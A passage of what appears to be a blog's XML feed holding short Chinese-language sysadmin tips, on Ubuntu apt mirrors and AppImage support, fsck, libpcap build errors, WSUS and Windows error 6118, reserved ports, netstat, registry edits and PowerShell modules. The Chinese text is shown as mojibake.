        <content type="html"><![CDATA[<h1 id="ubuntu22-04LTSä¸èƒ½è¿è¡ŒAppimage"><a href="#ubuntu22-04LTSä¸èƒ½è¿è¡ŒAppimage" class="headerlink" title="ubuntu22.04LTSä¸èƒ½è¿è¡ŒAppimage"></a>ubuntu22.04LTSä¸èƒ½è¿è¡ŒAppimage</h1><h2 id="å…ˆæ¢ä¸ªæº"><a href="#å…ˆæ¢ä¸ªæº" class="headerlink" title="å…ˆæ¢ä¸ªæº"></a>å…ˆæ¢ä¸ªæº</h2><p>æ‰§è¡Œ<code>vim /etc/apt/sources.list</code></p><p>å°†ä¸‹é¢å†…å®¹ä»»é€‰ä¸€ä¸ªåŠ å…¥</p><p>é˜¿é‡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸­ç§‘å¤§</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç½‘æ˜“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.163.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ jammy-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ jammy-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å…ˆåˆ‡æ¢åˆ°rootï¼Œä¹Ÿå¯ä»¥ç›´æ¥åƒä¸‹é¢ä½¿ç”¨sudo"><a href="#å…ˆåˆ‡æ¢åˆ°rootï¼Œä¹Ÿå¯ä»¥ç›´æ¥åƒä¸‹é¢ä½¿ç”¨sudo" class="headerlink" title="å…ˆåˆ‡æ¢åˆ°rootï¼Œä¹Ÿå¯ä»¥ç›´æ¥åƒä¸‹é¢ä½¿ç”¨sudo"></a>å…ˆåˆ‡æ¢åˆ°rootï¼Œä¹Ÿå¯ä»¥ç›´æ¥åƒä¸‹é¢ä½¿ç”¨sudo</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-i</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å®‰è£…libfuseåº“"><a href="#å®‰è£…libfuseåº“" class="headerlink" title="å®‰è£…libfuseåº“"></a>å®‰è£…libfuseåº“</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libfuse2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntuè™šæ‹Ÿæœºè¿›å…¥initramfsæ¨¡å¼</title>
      <link href="/2022/05/12/ubuntu-xu-ni-ji-jin-ru-initramfs-mo-shi/"/>
      <url>/2022/05/12/ubuntu-xu-ni-ji-jin-ru-initramfs-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="ubuntuè™šæ‹Ÿæœºè¿›å…¥initramfsæ¨¡å¼"><a href="#ubuntuè™šæ‹Ÿæœºè¿›å…¥initramfsæ¨¡å¼" class="headerlink" title="ubuntuè™šæ‹Ÿæœºè¿›å…¥initramfsæ¨¡å¼"></a>ubuntuè™šæ‹Ÿæœºè¿›å…¥initramfsæ¨¡å¼</h1><p>å¯èƒ½æ˜¯æŸä¸ªåˆ†åŒºçš„å‡ºç°äº†é—®é¢˜</p><p>æŸ¥çœ‹ä½ çš„å‘½ä»¤è¡Œï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¦‚<code>/dev/sda5åˆ†åŒº</code>ä¿¡æ¯</p><p>å¦‚æœæœ‰ï¼Œæ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">fsck</span> <span class="token parameter variable">-y</span> /dev/sda5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åé‡å¯ï¼Œå…¶ä»–åˆ†åŒºä¹Ÿç›¸åŒ</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Neither flex nor lex was found</title>
      <link href="/2022/05/06/neither-flex-nor-lex-was-found/"/>
      <url>/2022/05/06/neither-flex-nor-lex-was-found/</url>
      
        <content type="html"><![CDATA[<h1 id="Neither-flex-nor-lex-was-found"><a href="#Neither-flex-nor-lex-was-found" class="headerlink" title="Neither flex nor lex was found"></a>Neither flex nor lex was found</h1><p>ç¼–è¯‘<code>./configure</code>libpcapæ—¶æŠ¥é”™Neither flex nor lex was found</p><p>å®‰è£…flexï¼Œbisonå°±èƒ½è§£å†³</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> flex<span class="token function">apt-get</span> <span class="token function">install</span> bison<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŠ¥é”™ï¼š<code>libpcap.so.1: cannot open shared object file: No such file or directory</code></p><p>æ‰§è¡Œï¼Œæ·»åŠ ä¸€ä¸ªé“¾æ¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/lib/libpcap.so.1 /usr/lib/libpcap.so.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é…ç½®WSUSè¿æ¥æ—¶HTTPé”™è¯¯</title>
      <link href="/2022/04/30/pei-zhi-wsus-lian-jie-shi-http-cuo-wu/"/>
      <url>/2022/04/30/pei-zhi-wsus-lian-jie-shi-http-cuo-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="é…ç½®WSUSè¿æ¥æ—¶HTTPé”™è¯¯"><a href="#é…ç½®WSUSè¿æ¥æ—¶HTTPé”™è¯¯" class="headerlink" title="é…ç½®WSUSè¿æ¥æ—¶HTTPé”™è¯¯"></a>é…ç½®WSUSè¿æ¥æ—¶HTTPé”™è¯¯</h1><p>æˆ‘å°è¯•<code>ping microsoft.com</code>ï¼Œå¹¶ä¸èƒ½pingé€šæ›´æ–°æœåŠ¡</p><p>æ‰“å¼€è‡ªåŠ¨æ›´æ–°ï¼Œä¹Ÿæ›´æ–°ä¸äº†ï¼Œåº”è¯¥å°±æ˜¯ç½‘ç»œçš„åŸå› </p><p>é¦–å…ˆå…³é—­é˜²ç«å¢™ï¼Œå¦‚æœæ˜¯é™æ€IPè¦ä¿è¯èƒ½è®¿é—®å¤–ç½‘ï¼Œä¸ç„¶ä½ å¯ä»¥æ¢æˆDHCPï¼Œè‡ªåŠ¨è·å–</p><p>ç„¶åå¯ä»¥è®¾ç½®ä»£ç†æœåŠ¡å™¨ï¼Œæˆ–è€…æŒ‚ä¸€ä¸ªä»£ç†è½¯ä»¶</p><p>æ³¨ï¼šä½ å¯ä»¥å…ˆæŠŠä¸»æœºçš„ç³»ç»Ÿå…ˆæ›´æ–°äº†ï¼Œè¯¥æ‰“çš„è¡¥ä¸æ‰“äº†</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘ç”Ÿç³»ç»Ÿé”™è¯¯6118</title>
      <link href="/2022/04/30/fa-sheng-xi-tong-cuo-wu-6118/"/>
      <url>/2022/04/30/fa-sheng-xi-tong-cuo-wu-6118/</url>
      
        <content type="html"><![CDATA[<h1 id="å‘ç”Ÿç³»ç»Ÿé”™è¯¯6118æ­¤å·¥ä½œç»„çš„æœåŠ¡å™¨åˆ—è¡¨å½“å‰æ— æ³•ä½¿ç”¨"><a href="#å‘ç”Ÿç³»ç»Ÿé”™è¯¯6118æ­¤å·¥ä½œç»„çš„æœåŠ¡å™¨åˆ—è¡¨å½“å‰æ— æ³•ä½¿ç”¨" class="headerlink" title="å‘ç”Ÿç³»ç»Ÿé”™è¯¯6118æ­¤å·¥ä½œç»„çš„æœåŠ¡å™¨åˆ—è¡¨å½“å‰æ— æ³•ä½¿ç”¨"></a>å‘ç”Ÿç³»ç»Ÿé”™è¯¯6118æ­¤å·¥ä½œç»„çš„æœåŠ¡å™¨åˆ—è¡¨å½“å‰æ— æ³•ä½¿ç”¨</h1><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>å½“ä½ åœ¨åŸŸæœåŠ¡å™¨ä¸­è¿è¡Œ<code>net view /domain</code>æ˜¯æŠ¥é”™</p><p>å‘ç”Ÿç³»ç»Ÿé”™è¯¯6118ã€‚æ­¤å·¥ä½œç»„çš„æœåŠ¡å™¨åˆ—è¡¨å½“å‰æ— æ³•ä½¿ç”¨</p><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>é¦–å…ˆæ£€æŸ¥é™æ€IPæ˜¯å¦åœ¨è®¾ç½®çš„åŸŸç¯å¢ƒï¼Œæ²¡æœ‰å°±æ”¹å›æ¥</p><p>win+Ræ‰“å¼€è¿è¡Œæ¡†è¾“å…¥<code>services.msc</code>è¿è¡Œ</p><p>æ‰¾åˆ°<code>computer browser</code> æœåŠ¡</p><p>å¯åŠ¨ç±»å‹è®¾ç½®ä¸ºè‡ªåŠ¨</p><p>æœªå¯åŠ¨åˆ™æ‰‹åŠ¨å¯åŠ¨</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windowsç›‘å¬ç«¯å£å¤±è´¥</title>
      <link href="/2022/02/08/windows-jian-ting-duan-kou-shi-bai/"/>
      <url>/2022/02/08/windows-jian-ting-duan-kou-shi-bai/</url>
      
        <content type="html"><![CDATA[<h1 id="windowsç›‘å¬ç«¯å£å¤±è´¥"><a href="#windowsç›‘å¬ç«¯å£å¤±è´¥" class="headerlink" title="windowsç›‘å¬ç«¯å£å¤±è´¥"></a>windowsç›‘å¬ç«¯å£å¤±è´¥</h1><p>å½“ä½ åœ¨æŸäº›æƒ…å†µéœ€è¦ç”¨åˆ°ç›‘å¬ç«¯å£æ—¶ï¼Œä¼šå‡ºç°ç«¯å£ç›‘å¬å¤±è´¥ï¼Œè·å¾—ç±»ä¼¼ä¿¡æ¯<code>An attempt was made to access a socket in a way forbidden by its access permissions.</code>ï¼Œè¿™æ—¶ä½ é€šè¿‡å‘½ä»¤æŸ¥çœ‹ç«¯å£ä¿¡æ¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> -ano<span class="token operator">|</span><span class="token function">grep</span> ç«¯å£å·<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°è¿™ä¸ªç«¯å£å¹¶æ²¡æœ‰è¢«å ç”¨ï¼Œè¿™æ—¶è¿™äº›ç«¯å£å¯èƒ½è¢«ç³»ç»Ÿä¿ç•™äº†ï¼ŒæŸ¥çœ‹ä¿ç•™ç«¯å£</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh int ipv4 show excludedportrange <span class="token assign-left variable">protocol</span><span class="token operator">=</span>tcp<span class="token operator">|</span>udp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä½ å¯ä»¥é¿å¼€è¿™äº›ç«¯å£ï¼Œæˆ–è€…</p><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>å…³é—­å ç”¨ç¨‹åºï¼Œæˆ‘è¿™é‡Œé»˜è®¤hyper-vï¼Œå¤§å¤šæ•°éƒ½æ˜¯ï¼Œå…³é—­å<strong>é‡å¯</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dism.exe /Online /Disable-Feature:Microsoft-Hyper-V <span class="token comment"># å…³é—­</span>dism.exe /Online /Enable-Feature:Microsoft-Hyper-V <span class="token comment"># æ‰“å¼€</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li><p>é…ç½®åŠ¨æ€ç«¯å£ï¼ŒåŠ¨æ€ç«¯å£ä¸èƒ½è¢«ä¿ç•™ï¼Œç”¨å®Œå³é‡Šæ”¾</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh int ipv4 <span class="token builtin class-name">set</span> dynamicportrange <span class="token assign-left variable">protocol</span><span class="token operator">=</span>tcp <span class="token assign-left variable">startport</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token assign-left variable">numberofports</span><span class="token operator">=</span><span class="token number">254</span> <span class="token assign-left variable">store</span><span class="token operator">=</span>active<span class="token operator">|</span>persistent<span class="token comment"># startä¸ºèµ·å§‹ç«¯å£ï¼Œnumä¸ºå¾€åå¤šå°‘ä¸ªç«¯å£ï¼Œæœ€å°254ï¼Œstoreä¸ºç”Ÿæ•ˆçŠ¶æ€</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>å°†ä½¿ç”¨çš„ç«¯å£ç§»é™¤ä¿ç•™ç«¯å£</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh int ipv4 delete excludedportrange <span class="token assign-left variable">protocol</span><span class="token operator">=</span>tcp <span class="token assign-left variable">startport</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token assign-left variable">numberofports</span><span class="token operator">=</span><span class="token number">10</span><span class="token comment"># startportä¸ºèµ·å§‹ç«¯å£ï¼Œnumberofportsä¸ºå¾€åå¤šå°‘ä¸ªç«¯å£</span>netsh int ipv4 <span class="token function">add</span> excludedportrange <span class="token assign-left variable">protocol</span><span class="token operator">=</span>tcp <span class="token assign-left variable">startport</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token assign-left variable">numberofports</span><span class="token operator">=</span><span class="token number">10</span><span class="token comment"># è¿™æ˜¯æ·»åŠ </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windowsä¸­netstatå‘½ä»¤</title>
      <link href="/2022/02/08/windows-zhong-netstat-ming-ling/"/>
      <url>/2022/02/08/windows-zhong-netstat-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="windowsä¸­netstatå‘½ä»¤"><a href="#windowsä¸­netstatå‘½ä»¤" class="headerlink" title="windowsä¸­netstatå‘½ä»¤"></a>windowsä¸­netstatå‘½ä»¤</h1><h2 id="netstat-æŸ¥çœ‹Linuxä¸­ç½‘ç»œç³»ç»ŸçŠ¶æ€ä¿¡æ¯"><a href="#netstat-æŸ¥çœ‹Linuxä¸­ç½‘ç»œç³»ç»ŸçŠ¶æ€ä¿¡æ¯" class="headerlink" title="netstat-æŸ¥çœ‹Linuxä¸­ç½‘ç»œç³»ç»ŸçŠ¶æ€ä¿¡æ¯"></a>netstat-æŸ¥çœ‹Linuxä¸­ç½‘ç»œç³»ç»ŸçŠ¶æ€ä¿¡æ¯</h2><p><code>NETSTAT [-a] [-b] [-e] [-f] [-i] [-n] [-o] [-p proto] [-r] [-s] [-t] [-x] [-y] [interval]</code></p><p>é€‰é¡¹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-a</span> æ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬ç«¯å£<span class="token parameter variable">-b</span> æ˜¾ç¤ºåˆ›å»ºæ¯ä¸ªè¿æ¥æ‰€æ¶‰åŠçš„å¯æ‰§è¡Œæ–‡ä»¶æˆ–ç›‘å¬ç«¯å£ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼—æ‰€å‘¨çŸ¥çš„å¯æ‰§è¡Œæ–‡ä»¶å®¿ä¸»å¤šä¸ªç‹¬ç«‹çš„ç»„ä»¶ï¼Œåœ¨è¿™äº›æƒ…å†µä¸‹åˆ›å»ºè¿æ¥æ‰€æ¶‰åŠçš„ç»„ä»¶åºåˆ—æˆ–æ˜¾ç¤ºç›‘å¬ç«¯å£ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯æ‰§è¡Œæ–‡ä»¶åç§°åœ¨åº•éƒ¨çš„ <span class="token punctuation">[</span><span class="token punctuation">]</span> ä¸­ï¼Œé¡¶éƒ¨æ˜¯å®ƒè°ƒç”¨çš„ç»„ä»¶ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°è¾¾åˆ° TCP/IP<span class="token parameter variable">-e</span> æ˜¾ç¤ºä»¥å¤ªç½‘ç»Ÿè®¡ä¿¡æ¯ï¼Œè¿™å¯ä»¥ä¸ <span class="token parameter variable">-s</span> ç»“åˆä½¿ç”¨é€‰é¡¹<span class="token parameter variable">-f</span> æ˜¾ç¤ºå¤–å›½çš„å®Œå…¨é™å®šåŸŸå<span class="token punctuation">(</span>FQDN<span class="token punctuation">)</span>åœ°å€<span class="token parameter variable">-i</span> æ˜¾ç¤º TCP è¿æ¥åœ¨å…¶å½“å‰çŠ¶æ€ä¸‹èŠ±è´¹çš„æ—¶é—´<span class="token parameter variable">-n</span> ä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å·<span class="token parameter variable">-o</span> æ˜¾ç¤ºä¸æ¯ä¸ªè¿æ¥å…³è”çš„æ‹¥æœ‰è¿›ç¨‹ ID<span class="token parameter variable">-p</span> proto æ˜¾ç¤ºç”± proto æŒ‡å®šçš„åè®®çš„è¿æ¥ï¼›åŸå‹å¯ä»¥æ˜¯ä»¥ä¸‹ä»»ä½•ä¸€ç§ï¼šTCPã€UDPã€TCPv6 æˆ– UDPv6ã€‚å¦‚æœä¸ <span class="token parameter variable">-s</span> ä¸€èµ·ä½¿ç”¨æ˜¾ç¤ºæ¯ä¸ªåè®®ç»Ÿè®¡ä¿¡æ¯çš„é€‰é¡¹ï¼Œproto å¯ä»¥æ˜¯ä»¥ä¸‹ä»»ä½•ä¸€ç§ï¼šIPã€IPv6ã€ICMPã€ICMPv6ã€TCPã€TCPv6ã€UDP æˆ– UDPv6<span class="token parameter variable">-q</span> æ˜¾ç¤ºæ‰€æœ‰è¿æ¥ã€ç›‘å¬ç«¯å£å’Œç»‘å®šéä¾¦å¬ TCP ç«¯å£ã€‚ç»‘å®šçš„éä¾¦å¬ç«¯å£å¯èƒ½ä¼šä¹Ÿå¯èƒ½ä¸ä¼šä¸æ´»åŠ¨è¿æ¥ç›¸å…³è”<span class="token parameter variable">-r</span> æ˜¾ç¤ºè·¯ç”±è¡¨<span class="token parameter variable">-s</span> æ˜¾ç¤ºæ¯ä¸ªåè®®çš„ç»Ÿè®¡ä¿¡æ¯ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œç»Ÿè®¡ä¿¡æ¯æ˜¯é’ˆå¯¹ IPã€IPv6ã€ICMPã€ICMPv6ã€TCPã€TCPv6ã€UDP å’Œ UDPv6 æ˜¾ç¤ºï¼›-p é€‰é¡¹å¯ç”¨äºæŒ‡å®šé»˜è®¤å€¼çš„å­é›†<span class="token parameter variable">-t</span> æ˜¾ç¤ºå½“å‰è¿æ¥å¸è½½çŠ¶æ€<span class="token parameter variable">-x</span> æ˜¾ç¤º NetworkDirect è¿æ¥ã€ä¾¦å¬å™¨å’Œå…±äº«ç«¯ç‚¹<span class="token parameter variable">-y</span> æ˜¾ç¤ºæ‰€æœ‰è¿æ¥çš„ TCP è¿æ¥æ¨¡æ¿ä¸èƒ½ä¸å…¶ä»–é€‰é¡¹ç»“åˆä½¿ç”¨interval é‡æ–°æ˜¾ç¤ºé€‰å®šçš„ç»Ÿè®¡ä¿¡æ¯ï¼Œæš‚åœé—´éš”ç§’æ¯ä¸ªæ˜¾ç¤ºå™¨ä¹‹é—´ã€‚æŒ‰ CTRL+C åœæ­¢é‡æ–°æ˜¾ç¤ºç»Ÿè®¡æ•°æ®ã€‚å¦‚æœçœç•¥ï¼Œnetstat å°†æ‰“å°å½“å‰é…ç½®ä¿¡æ¯ä¸€æ¬¡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¸¸ç”¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> <span class="token parameter variable">-ano</span> <span class="token comment"># æ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬ç«¯å£å’ŒIDå·</span><span class="token function">netstat</span> -ano<span class="token operator">|</span><span class="token function">grep</span> yourfind grepä¹Ÿå¯ä»¥æ˜¯findstr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ProtoLocal AddressForeign AddressStatePID<br>åè®® æœ¬åœ°åœ°å€è¿œç¨‹åœ°å€çŠ¶æ€è¿›ç¨‹å·</p><p>Stateåˆ†ä¸º<br>LISTEN  ï¼šç›‘å¬çŠ¶æ€<br>ESTABLISHED ï¼šå·²å»ºç«‹è”æœº<br>TIME_WAIT ï¼šç­‰å¾…è”æœº</p>]]></content>
      
      
      <categories>
          
          <category> å‘½ä»¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> å‘½ä»¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªå®šä¹‰é¼ æ ‡å³é”®æ–°å»ºæ–‡ä»¶</title>
      <link href="/2022/01/15/zi-ding-yi-shu-biao-you-jian-xin-jian-wen-jian/"/>
      <url>/2022/01/15/zi-ding-yi-shu-biao-you-jian-xin-jian-wen-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="è‡ªå®šä¹‰é¼ æ ‡å³é”®æ–°å»ºæ–‡ä»¶"><a href="#è‡ªå®šä¹‰é¼ æ ‡å³é”®æ–°å»ºæ–‡ä»¶" class="headerlink" title="è‡ªå®šä¹‰é¼ æ ‡å³é”®æ–°å»ºæ–‡ä»¶"></a>è‡ªå®šä¹‰é¼ æ ‡å³é”®æ–°å»ºæ–‡ä»¶</h1><ol><li><p>win+R æ‰“å¼€è¿è¡Œçª—å£ï¼Œè¾“å…¥regeditè¿›å…¥æ³¨å†Œè¡¨</p></li><li><p>è¿›å…¥<code>è®¡ç®—æœº\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew</code>ç›®å½•ä¸‹</p></li><li><p><img src="https://s4.ax1x.com/2022/01/15/7GtjiT.png" alt="7GtjiT.png"></p><p>æŒ‰è¿™æ ·ä¿®æ”¹ï¼Œä¿®æ”¹æ—¶å¯èƒ½ä½ ä¼šé‡åˆ°é—®é¢˜ï¼Œçœ‹ä¸‹æ–‡è§£å†³æ–¹æ³•</p></li><li><p>è¿›å…¥<code>è®¡ç®—æœº\HKEY_CLASSES_ROOT\.md</code></p><p>å°†é»˜è®¤å€¼ä¿®æ”¹ä¸º<code>Typora.md</code></p><p><img src="https://s4.ax1x.com/2022/01/15/7GtvJU.png" alt="7GtvJU.png"></p></li><li><p><img src="https://s4.ax1x.com/2022/01/15/7GtxWF.png" alt="7GtxWF.png"></p><p>å¦‚å›¾ï¼Œå¦‚æœæ²¡æœ‰å°±è¿™æ ·ä¿®æ”¹</p></li></ol><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>è¿˜æ˜¯åˆ°<code>è®¡ç®—æœº\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew</code></p><p><img src="https://s4.ax1x.com/2022/01/15/7GNFdx.png" alt="7GNFdx.png"></p><p>å³å‡»ShellNewï¼Œç‚¹å‡»æƒé™ï¼Œç„¶åç‚¹å‡»é«˜çº§-&gt;ç¦ç”¨ç»§æ‰¿</p><p>åŒå‡»ä½ ç™»é™†çš„ç”¨æˆ·ï¼ˆå°±æ˜¯ä¸€ä¸ªå°äººå„¿é‚£ä¸ªï¼‰ï¼Œå–æ¶ˆå‹¾é€‰å®Œå…¨æ§åˆ¶ï¼Œç„¶ååº”ç”¨ï¼Œç¡®å®šï¼Œåˆ·æ–°</p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>æ·»åŠ å…¶ä»–çš„ä¹Ÿç±»ä¼¼</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershellå¯¼å…¥ä¸€ä¸ªè‡ªå·±å†™çš„æ¨¡å—</title>
      <link href="/2022/01/03/powershell-dao-ru-yi-ge-zi-ji-xie-de-mo-kuai/"/>
      <url>/2022/01/03/powershell-dao-ru-yi-ge-zi-ji-xie-de-mo-kuai/</url>
      
        <content type="html"><![CDATA[<h1 id="powershellå¯¼å…¥ä¸€ä¸ªè‡ªå·±å†™çš„æ¨¡å—"><a href="#powershellå¯¼å…¥ä¸€ä¸ªè‡ªå·±å†™çš„æ¨¡å—" class="headerlink" title="powershellå¯¼å…¥ä¸€ä¸ªè‡ªå·±å†™çš„æ¨¡å—"></a>powershellå¯¼å…¥ä¸€ä¸ªè‡ªå·±å†™çš„æ¨¡å—</h1><ol><li><p>æƒ³æŠŠä½ å†™çš„æ¨¡å—<code>name.psm1</code>æ”¾åœ¨<code>C:\Users\yourname\Documents\PowerShell\Modules\name</code>ç›®å½•ä¸‹</p><p>nameä¸ºä½ çš„æ¨¡å—å</p></li><li><p>ç¼–è¾‘æ–‡ä»¶<code>â€ªC:\Users\yourname\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</code>ï¼Œæ·»åŠ <code>Import-Module name</code></p></li><li><p>é‡æ–°å¯åŠ¨å°±okäº†</p></li><li><p>name.psm1å…¶å®æ”¾å“ªéƒ½å¯ä»¥ï¼Œä½ åªéœ€è¦æŠŠç¬¬äºŒæ­¥çš„nameæ¢ä¸ºç»å¯¹è·¯å¾„ï¼Œæˆ‘æ”¾åœ¨é‚£ä¸ªç›®å½•æ˜¯ä¸ºäº†å’Œå…¶ä»–æ¨¡å—ä¸€èµ·æ–¹ä¾¿ç®¡ç†</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
